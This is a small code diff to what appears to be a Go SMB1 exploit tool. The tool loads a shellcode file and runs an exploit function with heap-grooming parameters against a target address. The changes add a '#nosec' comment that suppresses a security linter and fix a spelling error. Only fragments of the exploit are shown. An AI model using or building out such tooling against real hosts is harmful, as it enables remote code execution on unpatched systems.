@@ -21,7 +21,7 @@ func main() {
 	flag.StringVar(&shellcode, "sc", "shellcode.bin", "shellcode file")
 	flag.Parse()
 
-	sc, err := ioutil.ReadFile(shellcode)
+	sc, err := ioutil.ReadFile(shellcode) // #nosec
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -108,7 +108,7 @@ func exploit(address string, grooms int, payload []byte) error {
 	}
 	raw, _, err := smb1GetResponse(conn)
 	if err != nil {
-		return fmt.Errorf("failed to get reponse about exploit: %s", err)
+		return fmt.Errorf("failed to get response about exploit: %s", err)
 	}
 	ntStatus := make([]byte, 4)
 	ntStatus[0] = raw[8]
